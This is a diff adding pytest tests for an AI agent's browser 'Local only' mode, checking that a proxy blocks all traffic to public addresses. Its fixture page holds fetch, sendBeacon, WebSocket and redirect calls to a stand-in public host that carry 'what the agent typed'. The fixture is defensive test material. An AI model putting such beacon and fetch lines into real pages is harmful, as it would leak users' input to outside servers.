@@ -227,3 +227,114 @@ async def test_real_edge_a_browser_whose_edge_died_is_replaced_on_the_next_open(
     finally:
         b.shutdown()
         site.close()
+
+
+# --------------------------------------------------------------------------- #
+# Local only: nothing the agent's browser does reaches a public address
+# --------------------------------------------------------------------------- #
+
+LEAKY_PAGE = """<html><head><title>Leaky</title>
+<script src="http://PUBLIC/cdn.js"></script>
+</head><body><p id=o>waiting</p>
+<img src="http://PUBLIC/pixel.png">
+<script>
+fetch('http://PUBLIC/api?typed=secret-ish').catch(function () {});
+navigator.sendBeacon('http://PUBLIC/beacon', 'what the agent typed');
+try { new WebSocket('ws://PUBLIC/ws'); } catch (e) {}
+fetch('/local-api').then(function (r) { return r.text(); })
+  .then(function (t) { document.getElementById('o').textContent = t; });
+</script>
+<a href="/hop">a server redirect to a public site</a>
+</body></html>"""
+
+
+def _public_hits(site: Site) -> list[tuple[str, str]]:
+    return [h for h in site.hits if h[0].startswith("public.test")]
+
+
+@REAL
+@pytest.mark.timeout(240)
+async def test_real_edge_local_only_reaches_no_public_address_at_all():
+    """DECISION (review, item 2b): outside Local only a page's own requests
+    go where the page sends them (a CDN script, its API) — like any browser
+    and the Browser pane. Under LOCAL ONLY nothing the agent's browser does
+    reaches a public address: it runs behind a proxy that refuses everything
+    outside this PC and the user's network, so a sub-resource, a fetch, a
+    beacon, a WebSocket and a server redirect's next hop never leave."""
+    from iron_jarvis.providers import egress
+
+    pages = {"/": LEAKY_PAGE, "/local-api": "local answer"}
+    site = Site(pages, redirects={"/hop": "http://PUBLIC/landed?carried=1"})
+    b = _browsers()
+    key = "build:local"
+    try:
+        # Outside Local only the page's requests go out (the decision's
+        # other half — and the proof the page really makes them).
+        await b.open(key, site.base, preview=site.base)
+        await asyncio.sleep(1.0)
+        assert {"/cdn.js", "/api?typed=secret-ish", "/beacon"} <= {p for _, p in _public_hits(site)}
+        await b.close(key, "test")
+        site.hits.clear()
+        with egress.local_only_scope(True):
+            opened = await b.open(key, site.base, preview=site.base)
+            await asyncio.sleep(1.5)
+            read = await b.read(key, preview=site.base)
+            assert "local answer" in read.text  # this PC still answers
+            hop = await b.click(key, "a server redirect to a public site", preview=site.base)
+        assert opened.title == "Leaky"
+        assert _public_hits(site) == [], site.hits
+        assert hop.url.rstrip("/") == site.base.rstrip("/")
+        assert any("Local only" in line for line in read.failed), read.failed
+    finally:
+        b.shutdown()
+        site.close()
+
+
+async def test_a_browser_started_outside_local_only_starts_again_inside_it(tmp_path, monkeypatch):
+    """The proxy is chosen when Edge starts, so a browser that was opened
+    outside Local only is never used inside it (and back): it is closed and
+    the next page_open starts one for the turn's setting, saying so."""
+    from iron_jarvis.providers import egress
+    from tests.test_build_browser_v1376 import DEV, FakeBackend
+
+    made: list[Any] = []
+
+    def factory(**kw):
+        backend = FakeBackend(**{k: v for k, v in kw.items() if k != "local_only"})
+        backend.local_only = bool(kw.get("local_only"))
+        made.append(backend)
+        return backend
+
+    inst = PB.AgentBrowsers(backend_factory=factory)
+    try:
+        await inst.open("build:s", DEV, preview=DEV)
+        assert made[-1].local_only is False
+        with egress.local_only_scope(True):
+            # The next call opens: a browser for Local only, and it says so.
+            res = await inst.open("build:s", DEV, preview=DEV)
+            assert made[-1].local_only is True and made[0].killed
+            assert any("Local only was turned on" in line for line in res.blocked), res.blocked
+            await inst.read("build:s", preview=DEV)  # the same browser now
+        assert len(made) == 2
+        # Local only off again; the next call reads: closed, in words.
+        with pytest.raises(PB.BrowserProblem, match="Local only was turned off"):
+            await inst.read("build:s", preview=DEV)
+        assert made[1].killed and not inst.is_open("build:s")
+        await inst.open("build:s", DEV, preview=DEV)
+        assert len(made) == 3 and made[-1].local_only is False
+    finally:
+        inst.shutdown()
+
+
+def test_the_local_only_proxy_lets_through_exactly_the_private_addresses():
+    """The proxy's bypass list is built FROM egress's one definition of
+    "this PC or your network" (its address blocks and name suffixes), so the
+    two can never drift."""
+    from iron_jarvis.providers import egress
+
+    rules = PB.local_only_bypass().split(";")
+    for net in egress._PRIVATE_NETS:
+        assert str(net) in rules, net
+    for suffix in egress.PRIVATE_SUFFIXES:
+        assert "*" + suffix in rules, suffix
+    assert {"localhost", "*.localhost", "<local>"} <= set(rules)
